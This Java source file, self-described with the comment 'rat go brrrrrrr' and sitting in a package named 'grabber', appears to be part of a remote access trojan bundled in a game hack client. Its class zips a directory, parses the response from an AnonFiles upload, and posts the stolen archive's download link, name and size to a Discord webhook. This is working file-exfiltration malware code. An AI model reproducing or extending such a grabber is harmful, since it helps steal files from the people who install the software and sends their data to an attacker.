/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber;

import club.minnced.discord.webhook.send.WebhookEmbed;

import java.io.IOException;
import java.nio.file.FileAlreadyExistsException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import com.google.gson.*;

public class RTZipUtils {
    public static void pack(String sourceDirPath, String zipFilePath) throws IOException, FileAlreadyExistsException {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p))) {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                .filter(path -> !Files.isDirectory(path))
                .forEach(path -> {
                    ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                    try {
                        zs.putNextEntry(zipEntry);
                        Files.copy(path, zs);
                        zs.closeEntry();
                    } catch (IOException e) {
                        System.err.println(e);
                    }
                });
        }
    }

    public void parseAnonResponse(String in) {
        JsonObject json = new JsonParser().parse(in).getAsJsonObject();
        if (json.get("status").getAsBoolean()) { // file transfer was great success
            String jsonLink = json.get("data").getAsJsonObject()
                .get("file").getAsJsonObject()
                .get("url").getAsJsonObject()
                .get("short").getAsString();  // the link to the file
            String jsonName = json.get("data").getAsJsonObject()
                .get("file").getAsJsonObject()
                .get("metadata").getAsJsonObject()
                .get("name").getAsString();  // the name of the file
            String jsonSize = json.get("data").getAsJsonObject()
                .get("file").getAsJsonObject()
                .get("metadata").getAsJsonObject()
                .get("size").getAsJsonObject()
                .get("readable").getAsString();  // human-readable filesize

            RTSender s = new RTSender();
            WebhookEmbed emb = new WebhookEmbedBuilder().setTitle(new WebhookEmbed.EmbedTitle("Download from AnonFiles",null))
                .setDescription(jsonLink)
                .addField(new WebhookEmbed.EmbedField(true,"Name",jsonName))
                .addField(new WebhookEmbed.EmbedField(true,"Size",jsonSize))
                .setColor(0x00FF00)
                .build();
            s.send(emb,"File Zipper",false);
        } else {
            String jsonErr = json.get("error").getAsJsonObject()
                .get("message").getAsString();
            RTSender s = new RTSender();
            WebhookEmbed emb = new WebhookEmbedBuilder().setTitle(new WebhookEmbed.EmbedTitle("Could not upload to AnonFiles",null))
                .setDescription(jsonErr)
                .setColor(0xFF0000)
                .build();
            s.send(emb,"Error",false);
        }
    }
}
